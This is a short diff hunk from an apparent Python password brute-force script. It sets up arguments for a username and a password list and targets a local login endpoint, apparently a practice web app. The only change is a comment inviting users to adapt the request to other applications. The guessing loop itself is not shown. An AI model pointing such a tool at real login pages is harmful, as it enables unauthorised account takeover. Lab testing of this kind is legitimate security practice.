@@ -7,7 +7,7 @@ parser = argparse.ArgumentParser(description='Login Password BruteForce')
 parser.add_argument('-u', dest='user', help='Email or Password', required=True)
 parser.add_argument('-r', dest='file', type=str, help='Password List', required=True)
 args = parser.parse_args()
-
+# You Can change reques based on application you Test
 url = "http://127.0.0.1:3000/rest/user/login"
 cookies = {"language": "en", "welcomebanner_status": "dismiss"}
 headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0", "Accept": "application/json, text/plain, */*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/json", "Origin": "http://127.0.0.1:3000", "Connection": "close", "Referer": "http://127.0.0.1:3000/", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin"}
